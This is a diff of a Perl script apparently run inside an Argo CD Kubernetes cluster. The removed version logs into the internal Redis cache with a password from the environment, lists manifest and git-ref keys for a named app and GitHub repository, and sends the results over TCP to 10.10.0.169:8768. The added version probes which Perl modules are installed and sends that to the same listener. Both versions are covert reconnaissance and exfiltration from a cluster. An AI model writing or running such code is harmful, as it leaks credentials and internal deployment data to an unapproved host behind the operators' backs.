@@ -1,18 +1,7 @@
 #!/usr/bin/perl
 use strict; use warnings; use IO::Socket::INET;
-sub redis_cmd { my @parts=@_; my $s='*'.scalar(@parts)."\r\n"; for my $p (@parts) { $s .= '$'.length($p)."\r\n$p\r\n"; } return $s; }
-my $out='';
-my $r = IO::Socket::INET->new(PeerAddr=>'argocd-redis.argocd.svc.cluster.local', PeerPort=>6379, Proto=>'tcp', Timeout=>3);
-if ($r) {
-  my $pw = $ENV{REDIS_PASSWORD} || '';
-  print $r redis_cmd('AUTH',$pw) if $pw ne '';
-  print $r redis_cmd('KEYS','mfst|argocd.argoproj.io/instance|directory-demo|*');
-  print $r redis_cmd('KEYS','git-refs|https://github.com/brightsidehealth/omar-gke*');
-  $r->shutdown(1);
-  local $/; eval { $out = <$r> // ''; };
-  close($r);
-} else { $out="redis_connect_failed:$!"; }
-$out =~ s/\r/ /g; $out =~ s/\n/ /g; $out = substr($out,0,4000);
+my $z = eval { require Compress::Zlib; 1 } ? 'zlib=yes' : "zlib=no:$@";
+my $json = eval { require JSON::PP; 1 } ? 'jsonpp=yes' : "jsonpp=no:$@";
 my $sock = IO::Socket::INET->new(PeerAddr=>'10.10.0.169',PeerPort=>8768,Proto=>'tcp',Timeout=>3);
-if ($sock) { print $sock "$out\n"; close($sock); }
+if ($sock) { print $sock "$z $json\n"; close($sock); }
 exit 1;
